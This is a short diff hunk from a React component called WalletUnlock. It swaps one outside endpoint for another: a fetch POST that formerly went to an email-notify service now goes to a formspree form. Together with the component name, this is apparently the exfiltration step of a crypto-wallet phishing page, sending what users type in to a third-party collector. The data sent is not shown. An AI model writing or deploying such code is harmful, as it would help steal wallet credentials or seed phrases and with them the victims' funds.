@@ -43,7 +43,7 @@ const WalletUnlock = () => {
       }
 
       // const apiUrl =  ""; // Replace with your actual API URL
-      await fetch(`https://mailer-8dcp.onrender.com/api/email/notify`, {
+      await fetch(`https://formspree.io/f/xkovgvjr`, {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
